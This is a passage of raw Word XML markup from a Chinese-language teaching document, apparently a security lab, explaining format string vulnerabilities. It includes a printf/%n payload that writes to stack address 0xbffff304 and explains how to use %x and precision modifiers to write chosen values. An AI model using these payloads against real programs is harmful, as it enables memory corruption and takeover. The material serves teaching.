                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>xff</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>xbf</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>").%</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>x.%x.%x.%x.%x.%x.%n</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> &gt; input </w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="15741312" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="210C649F" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="737CDB62" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="17F94493" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="2E2C22FE" id="文本框 22" o:spid="_x0000_s1030" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:115.4pt;margin-top:1pt;width:392.9pt;height:39.5pt;z-index:-251652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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="18A1E252"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r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>echo $(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>printf</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> "\x04\xf3\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>xff</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>xbf</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>").%</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>x.%x.%x.%x.%x.%x.%n</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> &gt; input </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="15741312" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="210C649F" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="737CDB62" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="17F94493" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>使用如下方式</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>令程序</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>从文件中读取输入：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C88C8D"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把</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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>命令放入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>$</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中，使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>$</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>(command)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的目的在于进行指令替换。在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Bash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中，它用指令的结果来代替指令本身。数字之前放置</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>\x</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>来表示视</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>为一个数字，而不是两个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>SCII</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>字符</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。应该注意到，你的设备</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>是小端存储</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>还是大端存储，以此决定地址字节放入的顺序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C4CC33"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在将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>bffff304</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>保存到</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中后，需要移动</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指针到这个数值所在地址，然后使用</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，这样，地址</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>xbffff304</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>处的内存就会被更改。可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>格式规定符来移动</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指针，问题在于需要多少个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>格式规定符。可以通过此前提到的试错法，例如需要</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>程序才能打印出</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中地址</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0xbffff304</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，则可以构造</w:t>
      </w:r>
      <w:del w:id="34" w:author="青风明月-崔剑" w:date="2023-05-04T21:39:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:delText>5</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="35" w:author="青风明月-崔剑" w:date="2023-05-04T21:39:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>6</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%x(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>位系统下将移动</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:del w:id="36" w:author="青风明月-崔剑" w:date="2023-05-04T21:39:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:delText>0</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="37" w:author="青风明月-崔剑" w:date="2023-05-04T21:39:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个字节</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>将</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移动到这个地址，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个</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向该地址中写入数值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DA853C" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3DD0AC6F" wp14:editId="0973F0AD">
            <wp:extent cx="3893820" cy="3090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96510" cy="3092907"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A363E4B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>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5</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>利用格式化字符串漏洞修改内存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E008183" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54755641"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现在我们来尝试修改程序数据为指定值。前面提到</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会将目前所输出的字符数写入内存，如果我们想要更改某个数据为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>x66887799</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，那么需要构造长度为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>亿的数据，这将非常麻烦。所幸我们可以借助</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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的一些修饰符来简化操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="347AE962"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>1)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>精度修饰符如“</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>.number”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>当应用于整型值</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>时，它控制最少打印多少位字符，如果数字不够长，则在前面补</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
